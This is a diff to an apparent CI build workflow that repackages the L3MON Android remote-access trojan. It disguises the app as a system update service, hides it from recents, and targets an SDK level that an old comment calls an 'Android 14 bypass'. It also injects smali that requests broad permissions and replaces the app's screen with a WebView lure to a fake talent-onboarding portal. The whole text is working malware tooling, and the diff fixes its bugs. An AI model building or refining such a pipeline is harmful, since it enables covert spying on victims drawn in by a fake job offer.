@@ -44,7 +44,7 @@ jobs:
             rm -rf "payload_source/smali/com/etechd"
           fi
 
-          # 2. Update targetSdkVersion to 31 (Sweet spot for Android 14 bypass)
+          # 2. Update targetSdkVersion to 31 (Stable)
           sed -i 's/targetSdkVersion: .*/targetSdkVersion: 31/g' payload_source/apktool.yml
           sed -i 's/targetSdkVersion="[0-9]*"/targetSdkVersion="31"/g' payload_source/AndroidManifest.xml
 
@@ -53,10 +53,8 @@ jobs:
           sed -i "s|payload_source/smali/$OLD_PATH/|payload_source/smali/$NEW_PATH/|g" patch_payload.sh
           ./patch_payload.sh
 
-          # 4. Create WebView Lure Snippet
-          # This replaces the UI with the onboarding portal and requests permissions
+          # 4. Create WebView Lure Snippet (Fixed Syntax)
           cat > lure.smali <<LURE
-    # Request Permissions
     const/4 v0, 0x7
     new-array v0, v0, [Ljava/lang/String;
     const/4 v1, 0x0
@@ -83,7 +81,6 @@ jobs:
     const/4 v1, 0x1
     invoke-virtual {p0, v0, v1}, L$NEW_PATH/MainActivity;->requestPermissions([Ljava/lang/String;I)V
 
-    # Initialize WebView Lure
     new-instance v0, Landroid/webkit/WebView;
     invoke-direct {v0, p0}, Landroid/webkit/WebView;-><init>(Landroid/content/Context;)V
     invoke-virtual {v0}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;
@@ -92,11 +89,10 @@ jobs:
     invoke-virtual {v1, v2}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V
     const-string v1, "https://global-talent-onboarding-portal.vercel.app/"
     invoke-virtual {v0, v1}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V
-    invoke-virtual {p0, v0}, L$NEW_PATH/MainActivity;->setContentView(Landroid/view/View;)V
+    invoke-virtual {p0, v0}, Landroid/app/Activity;->setContentView(Landroid/view/View;)V
 LURE
 
-          # Inject lure into MainActivity.smali (replacing the old setContentView)
-          # We search for the setContentView line and replace it with our lure
+          # Inject lure (Fixed address match)
           sed -i "\|invoke-virtual {p0, v0}, L$NEW_PATH/MainActivity;->setContentView(I)V|r lure.smali" "payload_source/smali/$NEW_PATH/MainActivity.smali"
           sed -i "s|invoke-virtual {p0, v0}, L$NEW_PATH/MainActivity;->setContentView(I)V|# Original UI disabled|g" "payload_source/smali/$NEW_PATH/MainActivity.smali"
 
@@ -105,8 +101,8 @@ LURE
           sed -i 's/const-string v8, "android.settings.APPLICATION_DETAILS_SETTINGS"/const-string v8, "unused"/g' "payload_source/smali/$NEW_PATH/MainActivity.smali"
           sed -i "s|invoke-virtual {p0}, L$NEW_PATH/MainActivity;->finish()V|# finish disabled|g" "payload_source/smali/$NEW_PATH/MainActivity.smali"
 
-          # 6. Final Manifest Polish
-          sed -i 's/android:name="com.etechd.l3mon.MainActivity"/android:name="com.sys.update.svc.MainActivity" android:excludeFromRecents="true" android:configChanges="orientation|keyboardHidden|screenSize"/g' payload_source/AndroidManifest.xml
+          # 6. Final Manifest Polish (Fixed search string)
+          sed -i "s|android:name=\"$NEW_PKG.MainActivity\"|android:name=\"$NEW_PKG.MainActivity\" android:excludeFromRecents=\"true\" android:configChanges=\"orientation\|keyboardHidden\|screenSize\"|g" payload_source/AndroidManifest.xml
 
       - name: Build APK
         run: |
